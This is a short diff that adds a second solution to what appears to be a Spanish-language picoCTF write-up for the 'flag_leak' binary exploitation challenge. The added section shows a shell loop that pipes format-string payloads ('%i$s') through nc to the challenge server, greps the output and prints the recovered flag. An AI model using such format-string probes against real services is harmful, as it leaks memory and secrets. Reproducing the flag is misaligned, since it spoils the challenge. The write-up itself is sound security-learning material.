@@ -26,6 +26,15 @@ ff9317c0ff9317e08049346782578257825782578257825782578257825782578257825782578257
 ```
 
 ![[Pasted image 20241111105021.png]]
+
+
+## Solución 2
+```shell
+┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
+└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 54241 | grep -Ei "pico|ctf" ; done
+CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
+
+```
 ## Bandera
 ```css
 flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
